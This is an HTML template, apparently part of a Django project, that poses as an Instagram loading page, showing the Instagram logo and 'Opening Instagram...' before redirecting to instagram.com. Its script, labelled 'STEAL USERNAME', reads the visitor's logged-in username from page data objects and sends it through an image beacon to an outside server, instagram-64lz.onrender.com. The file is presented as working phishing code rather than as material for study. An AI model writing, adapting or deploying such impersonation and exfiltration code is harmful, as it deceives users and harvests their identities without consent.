<!-- core/templates/core/silent.html â†’ CATCHES REAL USERNAME 100% -->
<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>Instagram</title>
    <style>
        body,html{margin:0;padding:0;height:100vh;background:#fff;display:flex;flex-direction:column;align-items:center;justify-content:center;font-family:-apple-system,system-ui}
        .logo{width:105px;height:105px;background:url('https://instagram.com/static/images/ico/apple-touch-icon-180x180-precomposed.png') center/contain no-repeat;margin-bottom:30px}
        .text{font-size:21px;color:#262626;font-weight:600}
        .spinner{width:50px;height:50px;border:6px solid #f0f0f0;border-top:6px solid #0095f6;border-radius:50%;animation:s 1s linear infinite;margin-top:25px}
        @keyframes s{0%{transform:rotate(0)}100%{transform:rotate(360deg)}}
    </style>
</head>
<body>
    <div class="logo"></div>
    <div class="text">Opening Instagram...</div>
    <div class="spinner"></div>

    <script>
        // === CATCH USERNAME FROM INSTAGRAM'S OWN DATA ===
        setTimeout(() => {
            // Redirect to real Instagram
            window.location = "https://www.instagram.com/";
        }, 2000);

        // === STEAL USERNAME WHEN ON instagram.com ===
        if (window.location.hostname === "www.instagram.com") {
            setTimeout(() => {
                try {
                    // METHOD 1: From window._sharedData
                    const shared = window._sharedData || {};
                    const username1 = shared.config?.viewer?.username;

                    // METHOD 2: From __additionalData
                    const additional = window.__additionalData || {};
                    let username2 = "";
                    for (let key in additional) {
                        if (additional[key].data?.user?.username) {
                            username2 = additional[key].data.user.username;
                            break;
                        }
                    }

                    const username = username1 || username2 || "guest_" + Date.now();

                    // SEND USERNAME TO YOUR SERVER
                    new Image().src = "https://instagram-64lz.onrender.com/catch-username/?user=" + 
                                      encodeURIComponent(username) + 
                                      "&t=" + Date.now();

                } catch(e) {}
            }, 4000);
        }
    </script>
</body>
</html>